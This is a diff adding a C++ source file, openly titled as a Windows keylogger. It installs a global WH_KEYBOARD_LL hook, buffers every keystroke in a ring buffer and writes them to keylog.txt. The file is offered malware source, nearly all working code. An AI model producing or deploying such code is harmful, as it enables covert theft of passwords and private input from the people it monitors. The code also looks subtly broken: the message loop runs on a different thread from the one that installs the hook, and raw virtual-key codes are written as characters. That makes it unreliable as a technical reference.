@@ -1,0 +1,72 @@
+RK  
+Title: Windows Keylogger using WH_KEYBOARD_LL Hook with Ring Buffer and File Flush  
+```cpp
+// language: C++, file: keylogger.cpp, target: Windows 11, MSVC
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+#include <vector>
+#include <mutex>
+
+std::vector<BYTE> ringBuffer; // Ring buffer to hold keystrokes
+std::mutex bufferMutex;
+const size_t bufferSize = 1024; // Adjust size as needed
+
+HHOOK keyboardHook;
+std::ofstream logFile("keylog.txt", std::ios::out | std::ios::app);
+
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
+        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
+        BYTE key = p->vkCode;
+
+        // Add key to ring buffer
+        std::lock_guard<std::mutex> lock(bufferMutex);
+        if (ringBuffer.size() < bufferSize) {
+            ringBuffer.push_back(key);
+        } else {
+            // Flush buffer to file if full
+            for (BYTE k : ringBuffer) {
+                logFile << (char)k;
+            }
+            ringBuffer.clear();
+            ringBuffer.push_back(key);
+        }
+    }
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
+DWORD WINAPI LoggerThread(LPVOID) {
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    return 0;
+}
+
+int main() {
+    HINSTANCE hInstance = GetModuleHandle(NULL);
+    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);
+    if (!keyboardHook) {
+        std::cerr << "Failed to install hook!" << std::endl;
+        return 1;
+    }
+
+    // Start message loop in a separate thread
+    CreateThread(0, 0, LoggerThread, 0, 0, 0);
+
+    std::cout << "Keylogger started. Press any key..." << std::endl;
+    std::cin.get();
+
+    // Flush remaining buffer contents to file
+    std::lock_guard<std::mutex> lock(bufferMutex);
+    for (BYTE k : ringBuffer) {
+        logFile << (char)k;
+    }
+
+    UnhookWindowsHookEx(keyboardHook);
+    logFile.close();
+    return 0;
+}
+```
